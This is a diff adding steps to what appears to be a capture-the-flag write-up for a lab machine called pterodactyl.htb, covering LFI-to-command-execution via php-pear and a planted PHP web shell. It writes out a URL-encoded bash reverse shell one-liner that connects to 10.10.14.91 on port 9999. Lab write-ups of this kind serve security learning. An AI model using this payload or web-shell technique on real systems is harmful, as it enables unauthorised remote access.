@@ -174,4 +174,15 @@ Going back to the `changelog.txt` file, I remember that php-pear was enabled, wh
 The article below shows methods that php pear is used to change LFI to command execution
 https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a
 
+The payload to put a malicious php shell in the web directory so it is accessible via webpage
+<img width="1592" height="809" alt="image" src="https://github.com/user-attachments/assets/4dd3bbbb-085d-4510-bc04-bdd4892772c9" />
+
+Shows that in the root directory, we have command execution. It's messy but we see that we are the wwwrun user
+<img width="2251" height="243" alt="image" src="https://github.com/user-attachments/assets/ba616767-a0b2-4315-a556-0dfcbb4b2b3e" />
+
+We URL encoded a simple bash one liner to get a rev shell
+`http://panel.pterodactyl.htb/pwn.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.91/9999%200%3E%261'`
+
+rev shell
+<img width="644" height="186" alt="image" src="https://github.com/user-attachments/assets/cd94a40a-b0b2-4935-a3ef-f5599af6703a" />
 
